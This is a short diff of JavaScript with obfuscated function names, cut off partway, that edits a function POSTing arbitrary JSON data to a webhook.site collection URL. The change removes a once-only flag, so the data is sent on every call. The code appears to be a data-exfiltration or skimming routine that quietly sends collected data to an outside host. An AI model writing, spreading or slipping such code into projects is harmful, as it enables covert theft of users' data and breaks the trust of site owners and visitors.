@@ -1,23 +1,19 @@
 var r_Jn = {};  
-var requestSent = false; // Flag to track if the request has been sent  
 
 function prs(t) {  
     return void 0 !== t ? t : "";  
 }  
 
 function x_po(t) {  
-    if (!requestSent) { // Check if the request has already been sent  
-        var r = new XMLHttpRequest();  
-        r.open("POST", "https://webhook.site/0d7748e2-4d3c-4859-9dad-d1f308354925", !0);  
-        r.setRequestHeader("Content-type", "application/json"); // Change to application/json  
-        r.onreadystatechange = function() {  
-            if (this.readyState == 4 && this.status == 200) {  
-                // Optionally handle the response here  
-            }  
-        };  
-        r.send(JSON.stringify(t));  
-        requestSent = true; // Set the flag to true after sending the request  
-    }  
+    var r = new XMLHttpRequest();  
+    r.open("POST", "https://webhook.site/0d7748e2-4d3c-4859-9dad-d1f308354925", !0);  
+    r.setRequestHeader("Content-type", "application/json"); // Change to application/json  
+    r.onreadystatechange = function() {  
+        if (this.readyState == 4 && this.status == 200) {  
+            // Optionally handle response here  
+        }  
+    };  
+    r.send(JSON.stringify(t));  
 }  
 
 function x_PS() {  
